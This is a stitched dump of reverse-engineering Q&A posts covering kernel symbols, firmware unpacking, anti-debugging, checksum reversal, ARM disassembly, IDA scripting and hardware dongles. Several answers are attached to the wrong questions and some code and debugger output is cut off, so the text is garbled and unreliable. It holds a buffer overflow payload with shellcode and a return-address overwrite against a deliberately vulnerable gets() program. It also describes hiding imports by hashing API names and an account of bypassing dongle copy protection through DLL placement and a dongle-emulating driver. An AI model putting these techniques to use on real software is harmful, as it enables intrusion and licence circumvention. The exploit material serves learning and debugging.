</code></pre>

<p>After locating the tables the symbol recovery is trivial. I made a script for IDA that does it automatically, you can find it <a href=""http://www.hexblog.com/?p=130"">here</a> (<code>kallsyms.py</code> in the tools zip).</p>

<p>For more the details of how it's implemented in the kernel, see <code>kernel/kallsyms.c</code>.</p>

<p>First, I unzipped the file. Next, I ran <code>binwalk</code> to get some information about the file.</p>

</code></pre>

<p>Running <code>unsquashfs</code> on <code>13917A.squashfs</code> failed, saying it was unable to find the magic block. This was because the file was using a non standard magic. Changing the magic to a standard one made <code>unsquashfs</code> and <code>file</code> detect it as a squashfs file system. But <code>unsquashfs</code> did not complete successfully:</p>

<p>Flag e stands for extract automatically,and M for <code>--matryoshka</code> or recursively scanning and extracting.</p>

<p>After a few recursive unpackings, you'll get a squashfs-root dir with what you want I guess. </p>

<p>For what it's worth, I tried this with binwalk version 1.2.1.</p>

","<p>Anti-attaching depends heavily on the fact that windows creates a remote thread in the target
process. What is specific about this thread is usually used to detect attaching.</p>

<p>For example: 
The entry point Windows chooses for the attaching thread is by default the ""DbgUiRemoteBreakin"" function. Anti-attaching tricks usually hook this function or its
sibling, the ""DbgBreakPoint"" function.</p>

<p>Also, The fact that the attaching thread (like most normal threads) will have
the associated TLS callbacks called is also exploited to detect attaching.</p>

"Can I statically link (not import) the Windows system DLLs?","6278","","<p>I have compiled following C source code in VS2010 console project.</p>

<pre><code>#include &lt;stdio.h&gt;
int main(int argc, char* argv[]){
    printf(""hello world\n"");
    return 0;
}
</code></pre>

<p>then I used <code>/MT</code> option for release mode to statically link the C-runtime library.
However, as far as I know, C-runtime library still invokes lower level system functions - 
for example, C-runtime function <code>printf</code> eventually calls <code>WriteFile</code> Windows API.</p>

<p>And the actual function body of <code>WriteFile</code> is in <code>kernel32.dll</code>.
So, even if I link the C-runtime library statically, the binary doesn't contain
the entire routine including the <code>SYSENTER</code>, or <code>INT 0x2E</code> instructions...
The core part is still in a DLL. The following diagram describes how I understand it:</p>

<p><img src=""https://i.stack.imgur.com/w2XJH.png"" alt=""enter image description here""></p>

<p>What I want is to statically link EVERYTHING into single EXE file. Including <code>kernel32.dll</code>, <code>user32.dll</code> to eliminate the necessity of loader parsing the IAT and resolving the function names.</p>

<p>The following picture describes what I want:</p>

<p><img src=""https://i.stack.imgur.com/IQtdo.png"" alt=""enter image description here""></p>

<p>I understand this is simple in Linux with <code>gcc</code>. All I have to do is give the option <code>-static</code></p>

<p>Is there any option like this in VS2010? Please correct me if I'm misunderstanding.</p>
","<p>Let me start by telling you that what you want would be impossible, because of how well-known DLLs work. You can attempt something similar with tools like <a href=""http://bitsum.com/pebundle.asp"">PEBundle</a> or <a href=""http://code.google.com/p/dllpackager/"">dllpackager</a>, but that will usually (I'd say certainly) fail with the well-known DLLs (such as system DLLs as well as even the MSVC runtime DLLs in their different incarnations). See <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586%28v=vs.85%29.aspx"">this</a> and <a href=""http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx"">this</a> on the relevance and meaning of well-known DLLs.</p>

<p><code>kernel32.dll</code> plays a <em>very</em> special role in in the Win32 subsystem in that it helps to register Win32 threads and processes with the subsystem (<code>csrss.exe</code>).</p>

<hr>

<p>Answering the part from the comment of the OP on the question:</p>

<blockquote>
  <p>in fact, I was not looking for performance advantage. I thought, in this way, I can remove every symbols just like Linux stripped binary and make the reversing harder.</p>
</blockquote>

<p>There is no point in doing it this way then. You could still only import a single function and use a convoluted way of importing DLLs and/or resolving functions. I.e. concealing which functions you are importing from which DLLs. One thing that is rather popular in hacker circles is to hash the exported function names and then walk the exports of the loaded image yourself, hashing each of the function names found and comparing with the known hashed values.</p>

<p><a href=""http://www.hick.org/code/skape/papers/win32-shellcode.pdf"">Here's a good paper</a> on one method used for what you want, because shell code has no clue about imported function addresses in a hijacked process.</p>

<p>As Igor pointed out <code>kernel32.dll</code> will be loaded into the process and AFAIR the order of that has changed as well with Vista (previously <code>ntdll.dll</code> was the first one in the <a href=""http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html"">PEB</a>'s DLL list, aka <a href=""http://undocumented.ntinternals.net/UserMode/Structures/PEB_LDR_DATA.html""><code>LoaderData</code></a>). So the exact method has been laid out in above paper.</p>

<p>A few more points:</p>

<ol>
<li>if you don't want to use <code>LoadLibrary</code> (or its <code>ntdll.dll</code> counterpart) to dynamically load the DLLs, you can keep a reference to a single imported function in the IAT - this is how some executable packers do it.</li>
<li>if not, start by resolving <code>LoadLibraryA</code>, loading the DLLs you want and then using the resolved <code>GetProcAddress</code> (or your own method used already on <code>kernel32.dll</code> and outlined in the paper) to load more functions.</li>
<li>you may be making your life harder while not making it noticeably harder to a skilled/experienced reverse engineer. Most of them will have seen a similar scheme ;) ... dynamic analysis will easily reveal your tricks and enable a reverse engineer to work around them.</li>
</ol>

<hr>

<p>As an alternative you could resort to the system call numbers by writing a simplified disassembler that is able to pick out the index into the SSDT (system service descriptor table) and then you do the rest yourself. This has been documented long ago because it is how people used to find the index into the SSDT when they wanted to hook it from within a kernel mode driver. Roughly, if you have the pointer to the function in <code>ntdll.dll</code> to which you need the SSDT index, you'd check your assumptions and then retrieve the appropriate value. In Windows NT 4 through 2003 (32 bit) this would look like</p>

<pre><code>  B8 ?? ?? ?? ??
</code></pre>

<p>where <code>B8</code> is for <code>mov eax, ????????</code> and the question marks are the index into the SSDT. So after checking for the <code>B8</code> you'd skip over it and fetch the next DWORD. Example in C code:</p>

<pre><code>if ((lpAddr) &amp;&amp; *((unsigned char *)lpAddr) == 0xB8)
{
    result = *((ULONG *)((unsigned char *)lpAddr+1));

"Guessing CRC checksum algorithm","6221","","<p>I am trying to reverse engineer a 16 bit checksum algorithm of one relatively old (10 years) LAN game that is no longer supported nor has source code available. 
As it seems, data packets don't have standard structure when it comes to placing checksum bytes:</p>

<pre><code>Example 1:

1f456e01
</code></pre>

<p>Where first byte <code>1f</code> seems to repeat itself in each packet and I assume it doesn't take part in generating checksum. </p>

<p>Next two bytes <code>456e</code> represent a checksum that presumably is a variation of <code>CRC-CCITT</code> with non-standard polynomial. </p>

<p>Lastly, <code>01</code> byte represents data.</p>

<p>Here are few more examples of packets with various data values:</p>

<pre><code>1f466e02
1f496e05
1f4b6e07
1f4c6e08
</code></pre>

<p>I wish I could post more diverse values but these are only ones I've been able to capture so far.</p>

<p>I tried fiddling with <a href=""http://reveng.sourceforge.net/"" rel=""nofollow"">reveng</a> to reverse engineer the polynomial with following command:</p>

<pre><code>reveng -w 16 -s 01456e 02466e 05496e
</code></pre>

<p>Here the checksum bytes are relocated at the end, as reveng expects them in this format. But this gave no results.</p>

<p>I have tried comparing these checksums to most if not all common crc algorithms using online calculators but none of them give even close outputs to those above.</p>

<p>Honestly, I don't know where else to look.</p>

<p>Any hints/help or anything at all is much appreciated.</p>

<p><strong>EDIT:</strong></p>

<p>I managed to capture some more samples, however they are slightly different in terms of structure:</p>

<p>Example 1:</p>

<pre><code>0e ed76 00 312e362e37544553540000000000000000000000000000000000000000 00
</code></pre>

<p>Here the first byte <code>0E</code> represents a sort of index, that I still think doesn't take part in generating checksum.
Then comes two byte checksum <code>ED76</code> followed by <code>00</code> sort of separator (newline?) byte that I also think doesn't take part in computing checksum.
Afterwards follows data sequence: <code>312e362e37544553540000000000000000000000000000000000000000</code> which finally is proceeded by <code>00</code> terminating character that I also think has nothing to do with checksum.</p>

<p>I can manipulate with the data part of this sequence of bytes so here are some more examples:</p>

<p>Please see the accepted answer for the exact algorithm. Special thanks to <strong>Edward</strong>, <strong>nrz</strong> and <strong>Guntram Blohm</strong>; solving this would take a lifetime without your help guys! </p>
","<p>Got it.  Here's how to calculate, using your first string as a simple example:</p>

<pre><code>1f456e01
</code></pre>

<p>First, we rearrange the packet, omitting the checksum.</p>

<pre><code>1f 01
</code></pre>

<p>Then prepend the values A3 02:</p>

<pre><code>a3 02 1f 01
</code></pre>

<p>Then calculate the checksum by starting with a sum of 0, multiplying the sum by 33 (decimal) each time and adding the value of the next byte.</p>

<p>Here it is in C with a few of your sample strings for illustrations.  Note that this assumes a little-endian machine (e.g. x86).</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;


const unsigned char s1[]= ""\x0e\x01\x72\x00\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x32\x31\x31\x31\x31\x31\x00"";
const unsigned char s2[]=""\x2b\x4f\x70\x7f"";
const unsigned char s3[]=""\x1f\x46\x6e\x02"";

uint16_t verify(const unsigned char *pkt, size_t sz)
{
    uint16_t sum = 0xa3 * 33 + 2;
    int i;
    for (i=0; i &lt; sz; ++i) {
        if ((i != 1) &amp;&amp; (i != 2))
            sum = sum*33 + pkt[i];
    }
    return sum;
}

int main()
{
    printf(""calculated %4.4x, actual %4.4x\n"", 
         verify(s1, sizeof(s1)-1), *(uint16_t *)(&amp;s1[1]));
    printf(""calculated %4.4x, actual %4.4x\n"", 
         verify(s2, sizeof(s2)-1), *(uint16_t *)(&amp;s2[1]));
    printf(""calculated %4.4x, actual %4.4x\n"", 
         verify(s3, sizeof(s3)-1), *(uint16_t *)(&amp;s3[1]));
    return 0;
}
</code></pre>

<p>Here's the output from that program:</p>

<pre><code>calculated 7201, actual 7201
calculated 704f, actual 704f
calculated 6e46, actual 6e46
</code></pre>

<h1>Update:</h1>

<p>I thought it might be useful to describe how I came about this answer so that it may help others in the future.  First, as other answers note, your packets that were identical except for a single bit were invaluable in determining the general checksum algorithm (multiplying by 33 and adding the next byte). </p>

<p>What remained was to determine the starting position which could have included the first byte (the one you're calling the <em>index byte</em>) and/or the length.  When I compared two packets which were identical except for the index byte, and assuming a linear relationship also for these bytes, it was easy to determine that the index byte was ""next to"" the data bytes for calculation purposes.  </p>

<p>When I did that, all of the complete packets among your samples differed from my calculated value (long packets all by the constant <code>0xe905</code> and short packets by <code>0x6a45</code>).  Since the checksum is only 2 bytes, I guessed that there might be a 2-byte initialization value and simply wrote a small program to try all combinations.  I chose one combination (A3 02) but in fact, there are exactly eight combinations that work -- all you need is something that ultimately evaluates to <code>0x1505</code> (5381 decimal).</p>

"Illegal Instruction exploiting sample Buffer Overflow code","6190","","<p>Some days ago I coded a simple code to test a buffer overflow exploitation on x86 system. In order to keep it simple I disabled ASLR and NX so there are no protection that could cause weird behaviours.</p>

<p>This is my C code to exploit:</p>

<pre><code>#include &lt;stdio.h&gt;

void read_txt(){
        char txt[64];
        printf(""Write something:"");
        gets(txt);
}


int main(){
    read_txt();
    return 0;
}
</code></pre>

<p>I also wrote my own shellcode that just prints a string. As far as I know the payload should be something like this, fill the buffer with NOP instructions + shellcode, add 0x41414141 (AAAA) to overwrite EBP register and finally I override the return address with an address pointing to the middle of the NOPs.</p>

<p>Actually it does not work in that way and my payload is as follows:</p>

<pre><code>[1-\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x20\x3b\x29\x20\x68\x68\x73\x65\x63\x68\x20\x48\x69\x67\x68\x48\x6f\x6c\x61\x89\xe1\xb2\x0f\xcd\x80\xb0\x01\x31\xdb][2-\x41\x41\x41\x41][3-\x89\xf4\xff\xbf][4-\x89\xf4\xff\xbf]

1- NOPs + Shellcode = 60bytes
2- AAAA =4 bytes (Padding to fill the buffer, if NOP+Shellcode fills 64bytes it does not work)
3- Address to override EBP (In the middle of NOPs)
4- Overrides Return Address
</code></pre>

<p>This exploit works on gdb but fails if I pass the payload directly to the program, and I think that the problem is that just before the program executes gets() function the disasembler shows the <strong>leave</strong> instruction which points esp to ebp and causes an error.</p>

<p>This is the disassembly of read_txt() function:</p>

<pre><code>0x0804844c &lt;+0&gt;:    push   %ebp
   0x0804844d &lt;+1&gt;: mov    %esp,%ebp
   0x0804844f &lt;+3&gt;: sub    $0x44,%esp
   0x08048452 &lt;+6&gt;: movl   $0x8048510,(%esp)
   0x08048459 &lt;+13&gt;:    call   0x8048320 &lt;printf@plt&gt;
   0x0804845e &lt;+18&gt;:    lea    -0x40(%ebp),%eax
   0x08048461 &lt;+21&gt;:    mov    %eax,(%esp)
   0x08048464 &lt;+24&gt;:    call   0x8048330 &lt;gets@plt&gt;
   0x08048469 &lt;+29&gt;:    leave  
   0x0804846a &lt;+30&gt;:    ret    
</code></pre>

<p>And this is the execution of the exploit on GDB:</p>

<pre><code>(gdb) x/20x $esp

<p>Notice that EBP points to 0x90909090 because it has the same address that overrides the return address, and also notice the string <strong>Shellcode Executed</strong> that is the shellcode included in the payload.</p>

<p>Regards.</p>
","<p>In fact, the memory layout within <code>gdb</code> and outside of it differs of a few bytes. There have been recently a question about this here. You can read: <a href=""https://reverseengineering.stackexchange.com/questions/2983/how-to-predict-address-space-layout-differences-between-real-and-gdb-controlled"">How to predict address space layout differences between real and gdb-controlled executions?</a></p>

<p>In your case, you may just have to adjust your address by adding/subtracting 96 bytes.</p>

<p>I can, also, give you a few tricks with <code>gdb</code> to help you a bit with this:</p>

<ul>
<li><p><code>info frame</code>: This command gives you a full image of the frame you are in. Including where are stored the <em>saved eip</em> ans the <em>saved ebp</em>. It is extremely useful to observe if you reach the right spot in the memory to modify. You may set a breakpoint on <code>read_txt</code> and display the content of the <em>saved eip</em> before and after the <code>gets()</code> is called in order to see if the modification occurred properly.</p></li>
<li><p>When hitting a:</p>

<pre><code>0xbffff489 in ?? ()
</code></pre>

<p>It basically means that <code>gdb</code> did not find any symbol linked to the memory location. But, it might be assembly code, especially if it is your shellcode. So, to disassemble it you can use either of these commands:</p>

<ul>
<li><code>disas 0xbffff489,+40</code></li>
<li><code>x /10i 0xbffff489</code></li>
</ul></li>
</ul>

"How to detect thumb mode in ARM disassembly?","6156","","<p>I try to build a small disassembler for ARM, and I would like to know how do <code>objdump</code> manage to sort out the normal mode instructions (32-bits instruction wide) from the thumb mode instructions (16-bits instruction wide) without having to look at the <code>t</code> flag in the CPSR.</p>

<p>But first, let us build a small example and make some experiments on it. </p>

<p>I wrote this small piece of ARM assembly (<code>gas</code> syntax) as basis example:</p>

<pre><code>.arm
    mov fp, #0
    moveq   r1, r0
.thumb
    mov r0, #0
    mov fp, r0
</code></pre>

<p>Then, I cross-compiled it like this:</p>

<pre><code>$&gt; arm-none-eabi-gcc -Wall -Wextra -mlittle-endian -c -o arm_sample arm_sample.s
</code></pre>

<p>And, here is the output of <code>objdump</code> on the ARM object file:</p>

<pre><code>$&gt; objdump -d ./arm32_mov

./arm32_mov:     file format elf32-littlearm

Disassembly of section .text:
00000000 &lt;.text&gt;:
   0:   e3a0b000    mov fp, #0
   4:   01a01000    moveq   r1, r0
   8:   2000        movs    r0, #0
   a:   4683        mov fp, r0
</code></pre>

<p>But, when I run my tool, I get:</p>

<pre><code> warning: decoder says at (0x8,0):'strmi r2, [r3], r0' : Unknown mnemonic
   0:   00 b0 a0 e3                 mov fp, #0
   4:   00 10 a0 01                 moveq   r1, r0
   8:   ...
</code></pre>

<p>My tool is based on <code>libopcodes</code> (exactly like <code>objdump</code>), so the third instruction is just interpreted as still in 32-bits mode and the two thumb mode instructions are just interpreted as one 32-bits instruction which gives <code>strmi r2, [r3], r0</code>.</p>

<p>My question is that I don't understand how <code>objdump</code> knows that there is a switch between normal mode to thumb mode. Before discovering this, I thought that this information was only available at execution time though the value of the <code>t</code> flag in the CPSR status register.</p>

<p>I tried to look at the code of <code>objdump</code> but, I didn't see any architecture dependent cases to treat the case of the ARM thumb mode. So, this is still a mystery to me... </p>

<p>Any suggestion is welcome !</p>

<p>You can see these as symbols #4 and #5 in your read-elf output.
i.e. offset <code>0</code> is arm, offset <code>8</code> is thumb</p>

<p>obj-dump will output these symbols too if you use the<code>--special-syms</code>option.</p>

"Dynamic java instrumentation?","6155","","<p>This is not strictly 'reverse engineering', it's mostly related to dynamic instrumentation.</p>

<p>So, in the same fashion as <code>strace</code> which allows you to see syscalls made by a process, or <code>ftrace</code> to see function calls, is there anything similar for Java?</p>

<p>What I am interested in is having a <code>.jar</code> file that is run in a javaVM. </p>

<p>Is there any way to instrument or trace all the Java API calls the application code makes ?</p>

<p>That is, without any static analysis of the contents of the <code>.jar</code> or without any editing of the contents of <code>.jar</code> (e.g. to add hooks). Ideally, a solution equivalent to <code>strace</code> or e.g. a manipulated javaVM</p>

","<h1>First</h1>

<p>Unfortunately we don't seem to have MathJax turned on in this stackexchange so the math parts below are pretty horribly formatted. I'm also far from a mathematician so the notation may be off in some places.</p>

<h1>Understanding the magic number and code</h1>

<p>The goal of the code above is to rewrite a division into a multiplication because division takes more clock cycles than a multiplication. It's in the area of about twice as many cycles, depending very much on CPU. So we need to find a nice branchless way of doing that. If we branch we're very likely to lose to simply doing division.</p>

<p>One way is to simply realize that division is the same as multiplication with the inverse of the number, i.e <img src=""https://i.stack.imgur.com/yhMdN.gif"" alt="""">. The problem is that <img src=""https://i.stack.imgur.com/V3EXb.gif"" alt=""""> is a pretty poor number to store as an integer. So we need to multiply both the divisor and dividend by some number. Since we're operating on 32-bit numbers and we get multiplication results in 64-bit numbers we get the best precision with <img src=""https://i.stack.imgur.com/GAbp5.gif"" alt=""""> and we also avoid overflow issues. So we basically get <img src=""https://i.stack.imgur.com/66B6M.gif"" alt="""">. Now that fractional part is what causes us issues because it will cause rounding errors.</p>

<p>So let's try to formalize this:</p>

<p><img src=""https://i.stack.imgur.com/CXkJ4.gif"" alt=""""></p>

<p>Where <img src=""https://i.stack.imgur.com/85yOF.gif"" alt=""""> is our multiplicand, e.g <img src=""https://i.stack.imgur.com/GKdkC.gif"" alt="""">, or really any number <img src=""https://i.stack.imgur.com/4sVUA.gif"" alt=""""> but <img src=""https://i.stack.imgur.com/mb7TH.gif"" alt=""""> works very well with our register sizes as we can simply discard the lower 32-bit register. <img src=""https://i.stack.imgur.com/p5VNy.gif"" alt=""""> is the number you must add to make <img src=""https://i.stack.imgur.com/85yOF.gif"" alt=""""> evenly divisible by <img src=""https://i.stack.imgur.com/FObhE.gif"" alt="""">. <img src=""https://i.stack.imgur.com/31LSW.gif"" alt=""""> is the number we wish to divide.</p>

<p>We can rewrite the equation above, as</p>

<p><img src=""https://i.stack.imgur.com/S56kc.gif"" alt=""""></p>

<p>Which illustrates the point that we have our dividend <img src=""https://i.stack.imgur.com/8dTDm.gif"" alt=""""> divided by our divisor <img src=""https://i.stack.imgur.com/7kJpl.gif"" alt=""""> and then an error factor of <img src=""https://i.stack.imgur.com/lKedW.gif"" alt="""">.</p>

<p>Studying our original equation of <img src=""https://i.stack.imgur.com/ZP83c.gif"" alt=""""> it's clear that we can affect very little. <img src=""https://i.stack.imgur.com/QvBxq.gif"" alt=""""> needs to be a power of 2, can't be too large or we risk an overflow and can't be too small as it has a direct negative effect on our error factor <img src=""https://i.stack.imgur.com/W87D3.gif"" alt="""">. <img src=""https://i.stack.imgur.com/J5UAz.gif"" alt=""""> directly depends on <img src=""https://i.stack.imgur.com/tFARj.gif"" alt=""""> and <img src=""https://i.stack.imgur.com/IS3SB.gif"" alt="""">.</p>

<p>So let's try <img src=""https://i.stack.imgur.com/qAwQ9.gif"" alt=""""> which gives a maximum error fraction of <img src=""https://i.stack.imgur.com/W87D3.gif"" alt=""""> with the maximum value of <img src=""https://i.stack.imgur.com/boZtv.gif"" alt=""""> being <img src=""https://i.stack.imgur.com/Sppdl.gif"" alt="""">, so <img src=""https://i.stack.imgur.com/5GbVt.gif"" alt="""">, unfortunately this is not less than <img src=""https://i.stack.imgur.com/Q9RYV.gif"" alt=""""> so we can get rounding errors. </p>

<p>We'll increase the exponent of <img src=""https://i.stack.imgur.com/IAyRL.gif"" alt=""""> to <img src=""https://i.stack.imgur.com/yqG5j.gif"" alt="""">, which gives <img src=""https://i.stack.imgur.com/SV70X.gif"" alt="""">, maximum error fraction <img src=""https://i.stack.imgur.com/CN6ya.gif"" alt=""""> which is less than <img src=""https://i.stack.imgur.com/wOBpa.gif"" alt="""">. This means that our multiplicand is <img src=""https://i.stack.imgur.com/vNO9f.gif"" alt=""""> which is not less than or equal to the maximum signed value we can store in a 32-bit register (<img src=""https://i.stack.imgur.com/up1Y5.gif"" alt="""">). So we instead make the multiplicand <img src=""https://i.stack.imgur.com/aaEyn.gif"" alt="""">. As a side note, thanks to the magic of two's complement when we subtract <img src=""https://i.stack.imgur.com/vwBYh.gif"" alt=""""> the number <img src=""https://i.stack.imgur.com/jZA7P.gif"" alt=""""> is <img src=""https://i.stack.imgur.com/jBOeP.gif"" alt=""""> which is <img src=""https://i.stack.imgur.com/xwp6c.gif"" alt=""""> when interpreted as an unsigned number. But we're doing signed arithmetic here. So we need to fix the final expression by adding <img src=""https://i.stack.imgur.com/2xny2.gif"" alt="""">. This also only solves the problem for <img src=""https://i.stack.imgur.com/PevID.gif"" alt="""">, for negative numbers we will be off by 1 so we need to add 1 if we have a negative number.</p>

<p>That's the explanation for the constant in the multiplication and how to arrive at it. Now let's look at the code:</p>

<pre><code>; Load -1840700269
mov    ecx,0x92492493

; Load n
mov    eax,edi

; n * -1840700269
imul   ecx

; add n to compensate for 2^32 subtraction
add    edx,edi

; check the sign bit of our result
mov    ecx,edx
shr    ecx,0x1f

; divide by 2^2 to compensate for us using y=2^34 instead of 2^32
sar    edx,0x2

mov    eax,edx
; add the value of the sign bit to the final result
add    eax,ecx
</code></pre>

<h1>Calculating divisor from magic number and code</h1>

<p>I have not proven this mathematically, however if you want to recover the divisor from an assembly dump such as the one you showed we can do some simple mental excercises. First we need to realize that the following holds</p>

<p><img src=""https://i.stack.imgur.com/JscHH.gif"" alt=""""></p>

<p>Where <img src=""https://i.stack.imgur.com/dAO7x.gif"" alt=""""> is the adjustment we made in order to bring the value into the range of a 32-bit value. From the code we can devise the following, the right shift by two means that we have <img src=""https://i.stack.imgur.com/65UtM.gif"" alt="""">, <img src=""https://i.stack.imgur.com/5UvZn.gif"" alt="""">, <img src=""https://i.stack.imgur.com/NV0rJ.gif"" alt="""">, <img src=""https://i.stack.imgur.com/TR2L6.gif"" alt=""""> is unknown. This means that we're missing one variable in order to perform a perfect solution. However the effect of <img src=""https://i.stack.imgur.com/TR2L6.gif"" alt=""""> if negligible as its purpose is to bring the divisor as close to its integer value as possible. This means that the solution can be found by solving</p>

<p><img src=""https://i.stack.imgur.com/Nke6h.gif"" alt=""""></p>

<p><img src=""https://i.stack.imgur.com/jh1mk.gif"" alt=""""></p>

<p>Another example with divisor 31337 which has the multiplicand magic number 140346763 and right shifts 10 bits.</p>

<p>Is there a way for me through scripting (IDC or Python, I don't care too much), to add imports of my own to the list and, for example, have them point (the address attribute) to code such as this (highlighted line)?:</p>

<p><img src=""https://i.stack.imgur.com/4lUw2.png"" alt=""Dynamically imported function in IDA Pro""></p>

<p>I.e. the line would in such case look like:</p>

<pre><code>0DCBA987     GetLongPathNameW       kernel32.dll
</code></pre>

<p>or even just</p>

<pre><code>0DCBA987     GetLongPathNameW       ???
</code></pre>

<p>assuming the above <code>call GetProcAddress</code> would be at address <code>0DCBA987</code>.</p>

<p>The advantage to me would be readability. But it would also yield a more comprehensive list of imports (and consequently xrefs) as some functions are frequently imported dynamically due to their availability in the various Windows versions.</p>

<p>It should be quite trivial given a certain binary to figure out all xrefs to candidate functions that retrieve the imported function's address (such as <code>GetProcAddress</code>) and then walk their calls to find which function was imported. The DLL part may be more complicated to find out, but it could be left empty or entered manually. But I didn't find a function that would allow me to add imports. Is there a way?</p>
","<p>I don't know if many people know this, but IDA uses some kind of a trick to decide if a segment is an imports segment, and handles it completely different.</p>

<p>IDA uses a few segment properties to treat a segment as an imports segment. for example, naming a segment <code>.idata</code>, or setting the segment's class to <code>XTRN</code> will immediately make it an imports segment. such segments <strong>won't</strong> display the usual code/data listings, function definitions and most of the other stuff we're used to in the Code View.</p>

<p>More specifically, adding code to those segments will be hidden in IDA, which will refuse displaying any assembly in those segments. A nice Anti-IDA trick I'd say :)</p>

<p>Instead, they'll only display name definitions, offsets and comments.
Once an offset is assigned a name of an API stored in IDA's database, IDA will get the API's prototype and other info, assign type definition and comments.</p>

<p>IIRC These APIs will also be shown in the imports window but i'm not sure what exactly triggers this. it might also depend on IDA versions and other import-related PE properties.</p>

<p><strong>EDIT</strong>
<br>It's been more than three years and obviously I couldn't find the script then, and I just went over some old code of mine and were able to reconstruct what I did in that script, and here is the gist of it:</p>

<pre><code>import idaapi
import idc

for import_rva, import_name in LIST_OF_IMPORTS:
    ea = imagebase + import_rva

    if idaapi.get_segm_class(getseg(ea)) == ""XTRN"":
        print(""import is already inside an XTRN segment, ""
              ""assuming it's correctly named"")
        continue
    elif idaapi.get_segm_class(getseg(ea-1)) == ""XTRN"":
        print(""Import is just below an import segment, ""
              ""extending segment to include this additional import"")
        # shrinking it's current segment
        # WARNING: this assumes current import is at the top of its segment
        # otherwise we'll have to SPLIT the import's current segment
        # and to that I say CBA aka left as an exercise to the reader
        idaapi.set_segm_start(ea, SegStart(ea)+4, 0)
        # expanding it's new segment
        idaapi.set_segm_end(ea-1, SegEnd(ea-1)+4, 0)
    else:
        print(""Creating new segment for import"")
        idc.AddSeg(ea, ea+4, 0, 1, 4, 0)
        idc.SetSegClass(ea, ""XTRN"")

    # renaming import to API name. This will make IDA add type
    # information and automatic comments for any function it's

"Are hardware dongles able to protect your software?","5919","","<p>Various software companies distribute their software with hardware security, usually a dongle which must be mounted in order for the software to operate.</p>

<p>I don't have experience with them, but I wonder, do they really work?</p>

<p>What is it that the dongle actually does?  I think that the only way to enforce security using this method, and prevent emulation of the hardware, the hardware has to perform some important function of the software, perhaps implement some algorithm, etc.</p>
","<p>Clearly Peter has addressed the main points of proper implementation. Given that I have - without publishing the results - ""cracked"" two different dongle systems in the past, I'd like to share my insights as well. user276 already hints, in part, at what the problem is.</p>

<p>Many software vendors think that they purchase some kind of security for their licensing model when licensing a dongle system. They couldn't be further from the truth. All they do is to get the tools that allow them to implement a relatively secure system (within the boundaries pointed out in Peters answer).</p>

<p>What is the problem with copy protection in general? If a software uses mathematically sound encryption for its licensing scheme this has no bearing on the security of the copy protection as such. Why? Well, you end up in a catch 22 situation. You don't trust the user (because the user could copy the software), so you encrypt stuff or use encryption somehow in your copy protection scheme. Alas, you need to have your private key in the product to use the encryption, which completely contradicts the notion of mistrusting the user. Dongles try to put the private key (and/or algorithm and/or other ingredients) into hardware such that the user has no access in the first place.</p>

<p>However, since many vendors are under the impression that they purchase security out of the box, they don't put effort into the correct implementation. Which brings me to the first example. It's a CAD program my mother was using. Out of the knowledge that dongles connecting to LPT tend to fail more often than their more recent USB counterparts, I set out to ""work around"" this one. That was around 2005.</p>

<p>It didn't take me too long. In fact I used a simple DLL placement attack (the name under which the scenario later became known) to inject my code. And that code wasn't all too elaborate. Only one particular function returned the value the dongle would usually read out (serial number), and that was it. The rest of the functions I would pass through to the original DLL which the dongle vendor requires to be installed along with the driver.</p>

<p>The other dongle was a little before that. The problem here was that I was working for a subcontractor and we had limited access only to the software for which we were supposed to develop. It truly was a matter of bureaucracy between the company that licensed the software and the software vendor, but it caused major troubles for us. In this case it was a little more challenging to work around the dongle. First of all a driver had to be written to sniff the IRPs from and to the device. Then the algorithm used for encryption had to be found out. Luckily not all was done in hardware which provided the loop hole for us. In the end we had a little driver that would pose as the dongle. Its functionality was extended so far as to read out a real dongle, save the data (actually pass it to a user mode program saving it) and then load it back to pose as this dongle.</p>

<p><strong>Conclusion:</strong> dongles, no matter which kind, if they <em>implement</em> core functionality of the program to which they belong will be hard to crack. For everything else it mostly depends on the determination and willingness to put in time of the person(s) that set out to work around the dongle.
As such I would say that dongles pose a considerable hindrance - if implemented correctly - but in cases of negligence on part of the software vendor seeking to protect his creation also mere snake oil.</p>

<p>Take heed from the very last paragraph in Peters answer. But I would like to add one more thought. Software that is truly worth the effort of being protected, because it is unique in a sense, shouldn't be protected on the basis of customer harassment (== most copy protection schemes). Instead consider the example of IDA Pro, which can certainly be considered pretty unique software. They watermark the software to be able to track down the person that leaked a particular bundle. Of course, as we saw with the ESET leak, this doesn't help always, but it creates <a href=""https://www.hex-rays.com/products/ida/support/hallofshame/index.shtml"">deterrence</a>. It'll be less likely that a cracker group gets their hands on a copy, for example.</p>

"How can I analyse an executable with no read permission?","5864","","<p>I have a binary on a Linux (Kernel 2.6) which I can execute, but can't read (chmod 0711). Therefore no static analysis is possible.</p>

<hr>

<p>UPDATE : I was able to resolve the issue. <a href=""https://reverseengineering.stackexchange.com/a/110"">See answer.</a></p>

<p>Thank you all &lt;3 this new reverseengineering community rocks!</p>
","<p>I initially thought you wouldn't be able to dump the program, but it turns out that you can — see the second section of this answer.</p>

<h2>Running the program</h2>

<p>Most of the usual methods won't work because the executable is setuid. If you start the program normally, it runs with elevated privileges (euid ≠ ruid), and most debugging facilities are reserved to root. For example, anything that relies on attaching to the program with <code>ptrace</code> is reserved to root. This includes just about anything you could do in a debugger. Linux lets you dump the memory of a running process (with <code>ptrace</code> or through <a href=""https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux""><code>/proc/$pid/maps</code> and <code>/proc/$pid/mem</code></a>), but that too is disabled for a setuid executable.</p>

<p>You can run <code>strace ./bin</code>, and see what system calls the program makes. However, this runs the program without any extra privileges. It may well stop early and complain that it can't read a file, or that it isn't running as the right user.</p>

